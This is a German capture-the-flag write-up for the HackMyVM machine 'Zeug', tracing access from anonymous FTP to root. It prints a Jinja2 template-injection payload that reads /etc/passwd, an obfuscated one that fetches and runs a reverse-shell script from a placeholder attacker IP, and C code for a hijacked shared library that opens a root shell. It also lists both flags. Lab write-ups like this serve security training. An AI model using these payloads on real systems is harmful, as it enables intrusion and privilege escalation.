# Zeug - HackMyVM (Hard)
 
![Zeug.png](Zeug.png)

## Übersicht

*   **VM:** Zeug
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Zeug)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 28. März 2024
*   **Original-Writeup:** https://alientec1908.github.io/Zeug_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Zeug"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines FTP-Servers (Port 21, anonymer Login erlaubt) und einer Python/Werkzeug Webanwendung auf Port 5000. Auf dem FTP-Server wurde eine `README.txt` gefunden, die auf den Benutzer `cosette` und einen aktivierten Debug-Modus in der Webanwendung hinwies. Die Webanwendung auf Port 5000 war anfällig für Server Side Template Injection (SSTI) im HTML-Upload. Obwohl Filter versuchten, gefährliche Schlüsselwörter zu blockieren, konnte durch einen spezifischen SSTI-Payload (`{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}`) LFI erreicht werden. Nachdem der Versuch, den Werkzeug-Debug-PIN zu berechnen (durch Sammeln von Systeminformationen via LFI), nicht direkt zum Erfolg führte, wurde ein anderer SSTI-Payload (`{{ config.__class__.from_envvar.__globals__.__builtins__.eval("__impor" + "t__('o" + "s').pop" + "en('wget http://[Angreifer-IP]/shel.sh; bash shel.sh').read") }}`) verwendet, um RCE zu erlangen und eine Reverse Shell als `cosette` zu erhalten. Als `cosette` wurde eine `sudo`-Regel gefunden, die erlaubte, `/home/exia/seed` als Benutzer `exia` auszuführen. Durch Reverse Engineering des `seed`-Programms (impliziert durch Ghidra-Notiz und XOR-Berechnung) wurde die korrekte Eingabe (`3039230856`) ermittelt, um eine Shell als `exia` zu erhalten. Die User-Flag wurde in dessen Home-Verzeichnis gefunden. Schließlich erlaubte eine weitere `sudo`-Regel dem Benutzer `exia`, `/usr/bin/zeug` als `root` auszuführen. Da `/usr/bin/zeug` unsicher eine Shared Library (`/home/exia/exia.so`) mittels `dlopen()` lud, konnte durch Erstellen einer bösartigen `exia.so` (die eine Root-Shell startete) und Ausführen von `sudo /usr/bin/zeug` Root-Zugriff erlangt werden.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `vi` / `nano`
*   `nikto`
*   `dirb`
*   `gobuster`
*   `curl`
*   `ftp`
*   `whatweb`
*   `hydra` (versucht)
*   `netdiscover`
*   `python3` (für SSTI Payloads, PIN-Berechnung, Reverse Shell, `http.server`)
*   `gcc`
*   `wget`
*   `Ghidra` (erwähnt)
*   `nc` (netcat)
*   `script` (für Shell-Stabilisierung)
*   `sudo`
*   Standard Linux-Befehle (`ls`, `cd`, `cat`, `echo`, `chmod`, `id`, `pwd`, `export`, `stty`, `mv`, `touch`, `find`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Zeug" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.122`). Eintrag von `zeug.hmv` in `/etc/hosts`.
    *   `nmap`-Scan identifizierte offene Ports: 21 (FTP - vsftpd 3.0.3, anonymer Login erlaubt) und 5000 (HTTP - Werkzeug/3.0.1 Python/3.11.2 "Zeug - Rendering HTML templates").
    *   `nikto` und `gobuster` auf Port 5000 fanden `/console` (Werkzeug Debug Console).
    *   Anonymer FTP-Login: Download von `README.txt` (enthielt Hinweis auf Benutzer `cosette` und Debug-Modus).
    *   Fehlermeldungen der Webanwendung auf Port 5000 (nach fehlgeschlagenem HTML-Upload mit `import`/`os`) zeigten den Pfad `/home/cosette/zeug/venv/...` und Filter gegen bestimmte Wörter.

2.  **Initial Access (SSTI RCE zu `cosette`):**
    *   Identifizierung einer Server Side Template Injection (SSTI)-Schwachstelle auf Port 5000 durch Test-Upload von `{{7*7}}`.
    *   Umgehung der Filter (`subclasses`, `[]`, `mro`) durch Zugriff auf Builtins über globale Objekte: `{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}` ermöglichte LFI.
    *   *Ein Versuch, den Werkzeug-Debug-PIN zu berechnen (durch Sammeln von Systeminformationen wie MAC, machine-id, boot_id via LFI), schlug fehl oder wurde nicht weiterverfolgt.*
    *   Erfolgreiche RCE durch einen SSTI-Payload, der String-Konkatenation zur Verschleierung von `import` und `os` nutzte und `wget` zum Herunterladen und Ausführen eines Shell-Skripts (`shel.sh`) verwendete:
        `{{ config.__class__.from_envvar.__globals__.__builtins__.eval("__impor" + "t__('o" + "s').pop" + "en('wget http://[Angreifer-IP]/shel.sh; bash shel.sh').read") }}`
    *   Das `shel.sh` enthielt eine Bash-Reverse-Shell.
    *   Erlangung einer interaktiven Shell als Benutzer `cosette`.

3.  **Privilege Escalation (von `cosette` zu `exia` via `sudo seed`):**
    *   `sudo -l` als `cosette` zeigte: `(exia) NOPASSWD: /home/exia/seed`.
    *   Das Binary `/home/exia/seed` wurde zur Analyse heruntergeladen. Ghidra-Analyse (impliziert) zeigte, dass es `rand()` ohne `srand()` verwendet und das Ergebnis mit `0xdeadbeef` XOR-verknüpft, um die erwartete Zahl zu erhalten.
    *   Berechnung der erwarteten Zahl (`0xdeadbeef ^ 1804289383 = 3039230856`).
    *   Ausführung von `sudo -u exia /home/exia/seed` und Eingabe von `3039230856`.
    *   Erlangung einer Shell als `exia`.
    *   User-Flag `HMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}` in `/home/exia/user.txt` gelesen.

4.  **Privilege Escalation (von `exia` zu `root` via `sudo zeug` und `dlopen` Hijacking):**
    *   `sudo -l` als `exia` zeigte: `(root) NOPASSWD: /usr/bin/zeug`.
    *   Das Binary `/usr/bin/zeug` wurde zur Analyse heruntergeladen. Ghidra-Analyse zeigte, dass es versuchte, `/home/exia/exia.so` mittels `dlopen()` zu laden.
    *   Erstellung einer bösartigen Shared Library (`exia.c`) in `/home/exia/`, die eine Root-Shell (`/bin/bash`) startete:
        ```c
        #include <stdio.h> #include <stdlib.h> #include <unistd.h>
        void inject()__attribute__((constructor));
        void inject() { unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash"); }
        ```
    *   Kompilieren zu `exia.so`: `gcc -fPIC -shared -o exia.so exia.c`.
    *   Ausführung von `sudo -u root /usr/bin/zeug`. Die manipulierte `exia.so` wurde geladen und ausgeführt.
    *   Erlangung einer Root-Shell.
    *   Root-Flag `HMYVM{root_Ut9RX5o7iZVKXjrgcGW3fxBq}` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Anonymer FTP-Zugriff:** Enthielt eine `README.txt` mit Hinweisen.
*   **Server Side Template Injection (SSTI) in Flask/Jinja2:** Ermöglichte LFI und RCE trotz Filtern durch Zugriff auf globale Objekte und Builtins.
*   **Unsicherer Pseudozufallszahlengenerator (`rand()` ohne `srand()`):** Ermöglichte die Vorhersage der erwarteten Eingabe für ein Sudo-Programm.
*   **Unsichere `sudo`-Konfigurationen:**
    *   `cosette` durfte ein Programm (`seed`) als `exia` ausführen, das eine vorhersagbare Eingabe erwartete.
    *   `exia` durfte ein Programm (`zeug`) als `root` ausführen, das eine Shared Library aus einem benutzerkontrollierten Pfad mittels `dlopen()` lud.
*   **Shared Library Hijacking (`dlopen()`):** Ein als Root laufendes Programm lud eine vom Benutzer manipulierbare Shared Library, was zur Codeausführung als Root führte.
*   **Werkzeug Debug Console (potenziell):** `/console`-Endpunkt gefunden, PIN-Bypass-Versuch vorbereitet, aber nicht final genutzt.

## Flags

*   **User Flag (`/home/exia/user.txt`):** `HMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}`
*   **Root Flag (`/root/root.txt`):** `HMYVM{root_Ut9RX5o7iZVKXjrgcGW3fxBq}`

## Tags

`HackMyVM`, `Zeug`, `Hard`, `FTP`, `SSTI`, `Flask`, `Jinja2`, `Werkzeug Debug`, `sudo Exploitation`, `rand() predictability`, `dlopen Hijacking`, `Shared Library Injection`, `Reverse Engineering`, `Ghidra`, `Privilege Escalation`, `Linux`, `Web`, `Python`
